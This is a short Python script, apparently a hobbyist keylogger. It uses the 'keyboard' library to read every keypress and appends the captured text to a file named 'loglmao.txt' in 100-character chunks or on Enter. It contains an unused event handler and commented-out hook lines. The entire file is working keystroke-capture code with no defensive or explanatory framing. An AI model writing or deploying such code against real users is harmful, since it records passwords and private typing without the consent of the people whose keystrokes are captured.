import keyboard
import time
keypress = ""
text = ""

def on_key_event(e):
    global text
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == "space":
            # Replace the word space with an actual space character
            text = text + " "
            time.sleep(0.1)
        else:
            # Print other keys as they are
            text = text + keypress
            time.sleep(0.1)

while True:
    keypress = keyboard.read_key()

    if len(text)>=100 or keypress=="enter":
        print(text)
        with open("loglmao.txt", "a") as file:
            file.write(text)
            file.write("\n")
        text = ""
    elif len(text)<100:
        #keyboard.hook(on_key_event)
        #time.sleep(0.1)
        if keypress=="space":
            text = text + " "
            time.sleep(0.1)
        elif keypress!="space" and keypress!="enter" and keypress!="shift" and keypress!="ctrl":
            text = text + keypress
            time.sleep(0.1)


